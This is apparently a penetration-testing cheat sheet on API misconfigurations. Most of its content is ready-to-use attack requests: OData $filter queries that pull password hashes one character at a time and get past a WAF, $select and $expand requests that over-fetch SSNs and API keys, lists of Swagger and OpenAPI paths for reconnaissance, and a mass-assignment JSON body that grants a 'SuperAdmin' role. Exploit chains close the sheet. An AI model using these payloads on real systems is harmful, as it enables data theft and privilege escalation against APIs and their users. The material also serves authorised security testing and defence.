# API Security Misconfiguration Reference

## Attack Surface Signals
- RESTful endpoints exposing metadata queries, OData syntax, Swagger/OpenAPI specifications, GraphQL endpoints with debug modes.
- Headers: `X-Api-Version`, `OData-Version`, `Swagger-Codegen`, `NSwag`.

## OData Exploitation ($filter, $select, $expand)
1. **WAF Bypass via OData Operator Injection**:
   - Standard SQL injection blocked by WAF, but OData queries pass directly to backend database:
     `GET /api/Users?$filter=startswith(Password,'a') eq true`
     `GET /api/Users?$filter=contains(Email,'admin')`
2. **Blind Data Extraction via Boolean OData Queries**:
   - Character-by-character extraction of sensitive hashes and keys:
     `/api/Products?$filter=substring(CreatedBy/PasswordHash,1,1) eq '5'`
3. **Data Over-Fetching via `$select` & `$expand`**:
   - Expand related relational models bypassing default projection limits:
     `/api/Orders?$expand=User,User/PaymentMethods,User/AuditLogs`
     `/api/Profiles?$select=Id,Email,PasswordHash,SSN,ApiKey`

## OpenAPI / Swagger / NSwag Exposure
1. **Common Specification Paths**:
   - `/swagger/v1/swagger.json`, `/swagger-ui.html`, `/api/swagger.json`, `/v2/api-docs`, `/v3/api-docs`, `/openapi.json`.
   - `/nswag/swagger.json`, `/api/index.html`.
2. **Schema Audit for High-Risk Endpoints**:
   - Look for internal maintenance endpoints (`/api/internal/reset_data`, `/api/admin/impersonate`, `/api/debug/dump`).
   - Check parameters marked as `deprecated: false` but unreferenced in main UI.

## Mass Assignment & Parameter Binding
1. **Automatic Model Binding Exploitation**:
   - Submitting administrative or state properties during registration or profile updates:
     ```json
     {
       "username": "attacker",
       "email": "attacker@evil.com",
       "password": "Password123!",
       "role": "SuperAdmin",
       "is_verified": true,
       "permissions": ["ALL"]
     }
     ```

## Exploit Chains
- **OpenAPI Spec Disclosure → Deprecated Admin Route Discovery → Pre-Auth State Mutation**.
- **OData $filter Injection → Blind Database Password Hash Exfiltration**.
- **Mass Assignment on User Update → Role Escalation to Administrator**.
